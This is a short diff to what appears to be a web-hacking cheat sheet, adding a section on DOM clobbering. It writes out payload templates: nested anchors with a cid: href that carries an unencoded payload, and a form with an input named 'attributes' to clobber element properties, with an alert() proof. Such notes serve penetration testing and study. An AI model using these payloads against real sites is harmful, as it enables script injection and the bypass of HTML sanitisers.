@@ -31,5 +31,11 @@
 ## DOM Clobbering
 **Looking for user controlled variables**
 ### Common
-- `window.<ID>` -> Make a HTML element with id `<ID>`
-- `<CLASS>.protoype.*`
+- `window.<ID>.<ACCESSOR>` -> 
+```
+<a id=<ID>><a id=<ID> name=<ACCESSOR> href='cid:&quot;<PAYLOAD>'> //cid protocol does not URL-encode elements
+```
+- `<CLASS>.protoype.*` | `<ELEMENT>.attributes.length`->
+```
+<form onload=alert()><input id=attributes>
+```
